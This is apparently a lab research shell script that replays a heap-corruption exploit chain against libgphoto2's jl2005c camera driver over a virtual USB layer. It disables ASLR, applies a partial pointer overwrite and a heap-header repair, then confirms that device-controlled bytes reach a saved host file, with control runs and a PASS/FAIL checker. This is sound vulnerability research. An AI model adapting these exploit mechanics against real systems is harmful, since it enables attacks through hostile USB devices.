#!/bin/sh
# W194: replay of the real-gphoto2-consumer result after W193's partial-priv
# overwrite, with the lab-only device-supplied glibc header repair.
# Requires the W193 base tree (run live/replay-partial-priv.sh once first).
# From the repository root:
#   sh lab/frontier/libgphoto2shell/live/replay-w194-file-consumer.sh
# This is an author replay of lab-assisted rung-4 mechanics: no physical USB,
# no wire, no command, no canary/live-address disclosure, not a witness verdict.
set -eu

HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
BASE=${BASE_WORK:-/tmp/w193-lgp-base}
OUT=${OUT:-$T/evidence/w194-file-consumer.out}
S=$BASE/src/libgphoto2-2.5.34
B=$BASE/build
P=$B/installdir
PROBE=$BASE/w194-file-consumer-probe
PRIV16=${PRIV16:-0x7430}
WRONG=${WRONG:-0x5430}

[ -d "$S" ] && [ -d "$B" ] || { echo "missing W193 base; run replay-partial-priv.sh first" >&2; exit 2; }
command -v clang >/dev/null || { echo "clang is required" >&2; exit 2; }
command -v setarch >/dev/null || { echo "setarch -R is required" >&2; exit 2; }
mkdir -p "$(dirname "$OUT")"
exec >"$OUT" 2>&1

echo "== apply lab-only W194 header repair to W193 base =="
cd "$S"
if ! grep -q M2SHELL_W194_REPAIR libgphoto2_port/vusb/vusb.c; then
	patch --dry-run -p1 < "$T/evidence/replay-vusb-heap-header-repair.patch"
	patch -p1 < "$T/evidence/replay-vusb-heap-header-repair.patch"
fi
got=$(sha256sum "$S/camlibs/jl2005c/jl2005c.c" | cut -d' ' -f1)
[ "$got" = 0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185 ] || \
	{ echo "vulnerable source sha mismatch $got" >&2; exit 2; }
make -C "$B/libgphoto2_port" -j4 >/dev/null
make -C "$B/libgphoto2_port" install >/dev/null
clang -O0 -g -fno-omit-frame-pointer -I"$P/include" -I"$T/pins" \
	$(pkg-config --cflags glib-2.0) \
	"$T/evidence/replay-file-consumer-probe.c" -o "$PROBE" \
	-L"$P/lib" -lgphoto2 -lgphoto2_port $(pkg-config --libs glib-2.0)

COMMON="CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib"
run() {
	label=$1; shift
	casefile=$BASE/w194-$label.case.out
	set +e
	env $COMMON "$@" > "$casefile" 2>&1
	echo "$?" > "$casefile.rc"
	set -e
	echo "=== $label (rc $(cat "$casefile.rc")) ==="
	cat "$casefile"
}

echo "== attack: ASLR off, device-chosen partial priv, header repair on =="
rm -f "$BASE/w194-attack.bin"
run ATTACK env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_PRIV16="$PRIV16" M2SHELL_W194_REPAIR=1 \
	setarch -R "$PROBE" usb:001,001 "$BASE/w194-attack.bin"

echo "== control: same corruption with no header repair =="
run NO_REPAIR env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_PRIV16="$PRIV16" \
	setarch -R "$PROBE" usb:001,001 "$BASE/w194-norepair.bin"

echo "== control: wrong 4-bit candidate with ASLR off, repair on =="
run WRONG env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_JL2005_PRIV16="$WRONG" M2SHELL_W194_REPAIR=1 \
	setarch -R "$PROBE" usb:001,001 "$BASE/w194-wrong.bin"

echo "== control: safe count 100 =="
run SAFE env M2SHELL_JL2005_VUSB=r M2SHELL_JL2005_COUNT=100 \
	M2SHELL_JL2005_PRIV16="$PRIV16" M2SHELL_W194_REPAIR=1 \
	M2SHELL_W194_SKIP_CONSUMER=1 \
	setarch -R "$PROBE" usb:001,001 "$BASE/w194-safe.bin"

python3 - "$BASE" <<'PY'
import os, sys
b = sys.argv[1]
def text(name):
    return open(os.path.join(b, "w194-%s.case.out" % name), errors="replace").read()
def check(ok, label):
    print(("PASS " if ok else "FAIL ") + label)
    return bool(ok)
a = text("ATTACK")
n = text("NO_REPAIR")
s = text("WRONG")
f = text("SAFE")
buf = b""
p = os.path.join(b, "w194-attack.bin")
if os.path.exists(p):
    buf = open(p, "rb").read(4)
results = [
    check("AFTER_INIT rc=0" in a, "attack init rc=0"),
    check("LIST rc=0 count=1" in a, "attack real file listing"),
    check("FILE_GET rc=0" in a, "attack real gp_camera_file_get"),
    check(size_ok := ("DATA rc=0 size=" in a), "attack real API data"),
    check("573139335a5a000100005a5a00005a5a" in a, "attack W193 marker through real API"),
    check("FILE_SAVE rc=0" in a, "attack real gp_file_save"),
    check(buf == bytes.fromhex("57313933"), "attack saved host file starts with device bytes"),
    check("malloc(): invalid next size (unsorted)" in n, "no-repair malloc abort"),
    check("FILE_SAVE rc=0" not in n, "no-repair no consumer side effect"),
    check("malloc():" in s and "FILE_SAVE rc=0" not in s, "wrong-candidate control aborts without consumer write"),
    check("57313933" not in s, "wrong-candidate control no W193 marker"),
    check("AFTER_INIT rc=0" in f, "safe count init rc=0"),
    check("57313933" not in f, "safe count no W193 marker"),
]
print("RESULT: %d PASS / %d FAIL" % (sum(results), len(results) - sum(results)))
raise SystemExit(0 if all(results) else 1)
PY
# End W194 replay.
